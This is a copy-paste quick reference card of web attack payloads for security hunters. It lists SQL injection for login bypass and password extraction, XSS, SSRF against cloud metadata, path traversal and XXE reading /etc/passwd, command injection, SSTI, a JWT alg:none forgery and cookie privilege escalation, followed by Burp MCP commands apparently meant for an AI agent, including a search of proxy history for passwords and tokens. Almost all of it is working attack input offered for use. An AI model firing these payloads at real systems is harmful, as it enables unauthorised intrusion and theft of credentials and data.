# Hunter Quick Reference Card

## One-Liner Payloads (Copy-Paste Ready)

### SQL Injection
```sql
' OR 1=1--                           # Basic auth bypass
' UNION SELECT NULL,NULL,NULL--      # Column count
' UNION SELECT username,password FROM users--  # Data extraction
' || pg_sleep(10)--                  # PostgreSQL time delay
' AND 1=1--                          # Boolean detection
```

### XSS
```html
<script>alert(1)</script>           # Basic reflected
'-alert(1)-'                         # JS string breakout
javascript:alert(1)                  # href attribute
#<img src=x onerror=alert(1)>       # DOM hashchange
```

### SSRF
```
http://127.1                         # Short form bypass
http://0x7f000001                    # Hex bypass
http://127.1/%2561dmin               # Double encode path
http://169.254.169.254/latest/meta-data/  # AWS metadata
```

### Path Traversal
```
../../../etc/passwd                  # Basic
....//....//....//etc/passwd         # Non-recursive strip
/etc/passwd                          # Absolute path
```

### Command Injection
```
|whoami                              # Pipe
;whoami                              # Semicolon
`whoami`                             # Backtick
$(whoami)                            # Subshell
```

### XXE
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

### SSTI
```
{{7*7}}                              # Jinja2/Twig
${7*7}                               # Freemarker
<%= 7*7 %>                          # ERB
```

### JWT
```
# alg:none attack
Header: {"alg":"none","typ":"JWT"}
Payload: {"sub":"admin","role":"admin"}
Signature: (empty)
```

### Access Control
```
Cookie: Admin=false → Admin=true     # Role tampering
Cookie: role=user → role=admin       # Privilege escalation
```

## Burp MCP Quick Commands

```bash
# Send request
burp(action="send", url="https://target/")

# Search proxy history
burp(action="proxy_search", regex="password|token|key")

# Generate OOB payload
burp(action="collaborator_generate")

# Check OOB callbacks
burp(action="collaborator_check")

# Get scanner findings
burp(action="scanner_issues", severity_filter="high,critical")

# Toggle intercept
burp(action="set_intercept", enabled=False)
```
